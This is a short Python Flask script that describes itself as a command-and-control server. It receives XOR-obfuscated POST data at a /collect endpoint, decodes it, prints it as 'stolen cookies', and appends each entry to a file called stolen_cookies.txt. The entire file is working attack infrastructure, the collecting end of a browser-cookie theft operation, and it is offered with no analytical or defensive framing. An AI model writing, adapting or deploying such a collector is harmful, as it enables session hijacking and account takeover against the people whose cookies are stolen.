from flask import Flask, request

app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    encrypted_data = request.get_data()
    
    # Decrypt with XOR 0x55
    decrypted_data = bytearray()
    for byte in encrypted_data:
        decrypted_data.append(byte ^ 0x55)
    
    decrypted_str = decrypted_data.decode('utf-8', errors='ignore')
    
    print("Received stolen cookies:")
    print(decrypted_str)
    
    with open('stolen_cookies.txt', 'a', encoding='utf-8') as f:
        f.write("--- New Entry ---\n")
        f.write(decrypted_str + "\n")
        
    return "OK", 200

if __name__ == '__main__':
    print("Starting C2 server on port 8080...")
    app.run(host='0.0.0.0', port=8080)
